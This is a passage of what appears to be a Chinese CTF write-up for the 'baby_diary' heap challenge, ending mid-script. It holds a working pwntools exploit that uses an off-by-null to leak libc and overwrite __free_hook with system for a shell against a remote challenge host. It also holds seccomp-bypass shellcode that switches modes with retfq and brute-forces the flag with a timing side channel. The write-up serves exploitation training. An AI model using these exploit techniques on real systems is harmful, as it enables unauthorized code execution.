class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./baby_diary&quot;</span></span><br><span class="line">libc_file = <span class="string">&quot;./libc-2.31.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="comment">#32bit:malloc_hook = main_arena-0x18</span></span><br><span class="line"><span class="comment">#32bit:main_arena+56(unsortedbin_addr)</span></span><br><span class="line"><span class="comment">#64bit:main_arena+96(unsortedbin_addr)//88 aslo have</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;)        #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(binary)</span></span><br><span class="line">    p = process(binary, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.31.so&quot;</span>&#125;)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;49153&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)  </span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt; &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, con</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sla(<span class="string">&quot;content: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(1)前期准备加堆布局:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 0-6</span></span><br><span class="line">        add(<span class="number">0x2000</span>-<span class="number">1</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    add(<span class="number">0x2000</span>-<span class="number">0x1410</span>-<span class="number">0x40</span>-<span class="number">1</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;tcache&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#crux chunk15</span></span><br><span class="line">    add(<span class="number">0xb20</span>-<span class="number">1</span>, <span class="string">&quot;largebin&quot;</span>) <span class="comment"># 15</span></span><br><span class="line">    <span class="comment">#prevent merge</span></span><br><span class="line">    add(<span class="number">0x10</span>-<span class="number">1</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(2)制作fake_chunk，利用largebin踩下fd_nextsize和bk_nextsize:</span></span><br><span class="line">    delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#chunk15 to largebin</span></span><br><span class="line">    add(<span class="number">0x1000</span>-<span class="number">1</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#15</span></span><br><span class="line">    <span class="comment">#make fake_chunk in chunk17</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, p64(<span class="number">0x6</span>) + p64(<span class="number">0x601</span>) + p8(<span class="number">0x40</span>)) <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(3)联动fastbin和smallbin：</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x18&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\xaa&#x27;</span>) <span class="comment"># 19</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x20&#x27;</span>) <span class="comment"># 20</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x21&#x27;</span>) <span class="comment"># 21</span></span><br><span class="line">    <span class="comment"># fill in tcache(0x30)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        delete(<span class="number">8</span> + i)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">20</span>)</span><br><span class="line">    delete(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clear tcache(0x30)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x08&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin to smallbin</span></span><br><span class="line">    add(<span class="number">0x400</span>-<span class="number">1</span>, <span class="string">&#x27;\x20&#x27;</span>) <span class="comment">#18</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get chunk18 from smallbin ,chunk20 to tcache</span></span><br><span class="line">    <span class="comment"># change chunk18-&gt;bk to point to fake_chunk</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, p64(<span class="number">0</span>) + p8(<span class="number">0x20</span>)) <span class="comment">#20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(4)利用fastbin修改chunk17-&gt;fd：</span></span><br><span class="line">    <span class="comment"># clear chunk from tcache</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;clear&#x27;</span>) <span class="comment"># 21 from tcache </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        delete(<span class="number">8</span> + i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free to fastbin</span></span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x08&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change chunk17-&gt;fd to point to fake_chunk</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, p8(<span class="number">0x20</span>)) <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(5)触发off-by-null:</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&quot;\x19&quot;</span>)<span class="comment"># 19 from fastbin</span></span><br><span class="line">    show(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x108</span>-<span class="number">1</span>, <span class="string">&quot;\x23&quot;</span>) <span class="comment"># 23 cutting from chunk15 in unsortebin,for overwrite</span></span><br><span class="line">    add(<span class="number">0x518</span>-<span class="number">1</span>, <span class="string">&quot;\x24&quot;</span>) <span class="comment"># 24 legacy from chunk15 in unsortebin,for trigger off-by-null</span></span><br><span class="line">    <span class="comment">#add(0x100-1, &quot;padding&quot;) # 24</span></span><br><span class="line">    <span class="comment"># off-by-null </span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">23</span>)</span><br><span class="line">    add(<span class="number">0x108</span>-<span class="number">1</span>,p64(<span class="number">0x0</span>)*<span class="number">0x21</span>)</span><br><span class="line">    delete(<span class="number">23</span>)</span><br><span class="line">    add(<span class="number">0x108</span>-<span class="number">1</span>,p64(<span class="number">0x0</span>)*<span class="number">0x1f</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">7</span>+<span class="string">&quot;\x06&quot;</span>)</span><br><span class="line">    <span class="comment">#edit(22, &quot;a&quot;*0x20 + p64(0x520))</span></span><br><span class="line">    <span class="comment"># trigger</span></span><br><span class="line">    delete(<span class="number">24</span>)</span><br><span class="line">    add(<span class="number">0x4e8</span>-<span class="number">1</span>,<span class="string">&quot;padding&quot;</span>)</span><br><span class="line">    show(<span class="number">23</span>)</span><br><span class="line">    ru(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    main_arena = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">96</span></span><br><span class="line">    malloc_hook = main_arena-<span class="number">0x10</span></span><br><span class="line">    libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">24</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    add(<span class="number">0x4e8</span>-<span class="number">1</span>,p64(<span class="number">0x30</span>)*<span class="number">8</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x31</span>)+p64(free_hook))</span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>,<span class="string">&quot;padding&quot;</span>)</span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>,p64(system_addr))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="comment">#add(0x18-1,&quot;A&quot;)</span></span><br><span class="line">    <span class="comment">#add(0x18-1,&quot;B&quot;)</span></span><br><span class="line">    <span class="comment">#delete(0)</span></span><br><span class="line">    <span class="comment">#add(0x18-1,p64(0x0)*2+(&quot;\x30&quot;+&quot;\x20&quot;).ljust(8,&quot;\x00&quot;))</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    <span class="comment">#p = process(binary)</span></span><br><span class="line">    <span class="comment">#p = process(binary, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;8.140.114.72&quot;</span>,<span class="number">1399</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">        p.recv(timeout = <span class="number">0.5</span>) </span><br><span class="line">        <span class="comment">#要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError</span></span><br><span class="line">        EOFError</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>

<p>二、shellcode：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_16-43-10.png" alt="img"></p>
<p>只有系统号0x9,0x5,0x25,0x0,0xe7才能正常被执行，而0x5在32位下是open，即可以利用到open，mmap，和read函数。对于ORW少了一个W，可以使用flag的逐个字符比较的方法来爆破出flag。由于切换retfq需要涉及到构造32位的栈地址，所以这里最好还是用mmap来申请指定位置的一片空间，从而劫持栈。</p>
<p>(1)mmap的设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,,0x7,0x22,0,0)*/</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rdx*/</span></span><br><span class="line"><span class="string">mov al,0x7</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rcx*/</span></span><br><span class="line"><span class="string">mov al,0x22</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rdi*/</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov edi,0x40404040</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rsi*/</span></span><br><span class="line"><span class="string">mov al,0x7e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rax*/</span></span><br><span class="line"><span class="string">mov al,0x9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set r8,r9*/</span></span><br><span class="line"><span class="string">xor r8,r8</span></span><br><span class="line"><span class="string">xor r9,r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>这里由于对输入字符做了限制，只能是可见字符，同时由于这里使用alpha3这个工具来将shellcode编码成可见字符。但是这个工具有一个缺点，就是不能出现\x00这个字符，所以如果我们使用mov rax,0x9则使得0x9在64位是0x0000000000000009，存在\x00字符，所以需要用到al,dl,等8位寄存器，来转换一下。</p>
<p>(2)read的设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov esi,0x40404040</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov dl,0x70</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>读入到之前用mmap开辟的空间0x40404040处。</p>
<p>(3)retfq的设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov esp,0x40404440</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>①需要32位的栈，同时劫持esp，使得栈上的完全可控，防止push出错。</p>
<p>②这里0x23为转32位，0x33为转64位。</p>
<p>③push 0x40404040是在retfq之后跳转的地方，需要放到栈上。</p>
<p>▲汇编点：存在xor,mov,retfq多的时候，需要是：shellcode_x64 = asm(shellcode_x64,arch = ‘amd64’,os=’linux’)才行。</p>
<p>以上的很多不太知道原理，具体的在具体用到时候再改。</p>
<p>(4)orw中的or设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ecx, eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_to64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x4040402b</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>(5)爆破的汇编代码设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag_pos == <span class="number">0</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;cmp byte ptr[rsp+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(flag_pos, ch)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;cmp byte ptr[rsp+&#123;0&#125;], &#123;1&#125;; jz $-5; ret&quot;</span>.<span class="built_in">format</span>(flag_pos, ch)</span><br></pre></td></tr></table></div></figure>

<p>这里的ch即为循环的可见字符，flag_pos是读出flag的对应位置，但是原理就是将读取的flag遍历比较所有可见字符，相等则使得程序跳入循环中，然后就可以通过设置timeout为某个值来判断这个字符是否相等，相等则加入到flag中。类似的有：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">check = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">cmp cl,dl</span></span><br><span class="line"><span class="string">jz loop</span></span><br><span class="line"><span class="string">mov al,231</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(reloc,ch)</span><br></pre></td></tr></table></div></figure>

<p>这里就用到了exit_group，另外rsp,rsi,甚至rbx都可以的，因为读取之后这三个寄存器都保存了flag的值：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_22-28-12.png" alt="img"></p>
<p>(6)汇总：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">shellcode_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov eax, 5</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx, esp</span></span><br><span class="line"><span class="string">    xor ecx, ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ecx, 